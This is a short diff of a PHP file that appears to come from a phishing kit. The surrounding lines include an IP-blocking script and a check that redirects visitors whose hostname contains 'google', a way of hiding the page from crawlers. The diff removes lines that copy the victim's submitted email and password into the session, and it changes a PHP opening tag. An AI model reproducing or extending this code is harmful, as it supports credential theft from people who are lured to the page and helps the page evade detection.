@@ -7,8 +7,7 @@ include('../../functions/BlockIP.php');
 ##################### SECOND FILES #####################
 include('../../functions/get_lang_en.php'); 
 ################## ACCOUNT INFORMATION #################
-$_SESSION['_login_email_']    = $_POST['login_email'];
-$_SESSION['_login_password_'] = $_POST['login_password'];
+
 
 ################## ACCOUNT INFORMATION #################
 $charSet = "XXXXID0123456789";
@@ -37,7 +36,7 @@ if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('H
 //----------------------------------------------------------------------------------------------------------------//
 ?>
 
-<?
+<?php
 
 if(isset($_POST['btnLogin'])){  
 
